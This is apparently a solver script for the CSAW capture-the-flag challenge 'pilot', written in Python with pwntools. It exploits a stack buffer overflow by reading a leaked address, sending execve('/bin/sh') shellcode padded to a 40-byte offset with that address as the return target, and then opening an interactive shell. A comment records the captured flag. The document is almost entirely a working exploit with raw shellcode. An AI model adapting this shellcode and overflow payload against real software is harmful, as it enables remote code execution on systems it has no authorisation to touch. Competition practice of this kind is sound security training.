from pwn import *

host = "pwn.chal.csaw.io"
port = 8464
r = remote(host,port)
#r=process('./pilot')

#sleep(8)

r.recvuntil("Pilot!....\n")

stringgg=r.recvuntil("\n")

addr=stringgg[12:]

print addr

base=int(addr,16)


r.recvuntil("Command:")

#flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}

#buffer=40

shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
print len(shellcode)

payload=shellcode+'\x90'*(40-len(shellcode))+p64(base)

r.sendline(payload)

r.sendline("ls -al")


r.interactive()
